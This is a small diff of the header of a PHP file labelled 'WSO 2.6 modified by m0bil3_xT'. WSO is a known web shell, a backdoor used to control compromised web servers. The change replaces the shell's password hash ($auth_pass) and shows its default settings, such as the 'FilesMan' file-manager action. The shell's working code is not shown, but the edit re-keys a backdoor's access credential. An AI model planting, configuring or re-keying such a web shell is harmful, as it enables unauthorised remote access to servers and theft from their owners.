@@ -1,6 +1,6 @@
 <?php
 /* WSO 2.6 modified by m0bil3_xT */ 
-$auth_pass = "6052255e474ff24b3eebf63e5cfaf100";
+$auth_pass = "a727563903d3000164c58f515fb96a52";
 $color = "white";
 $default_action = 'FilesMan';
 $default_use_ajax = true;
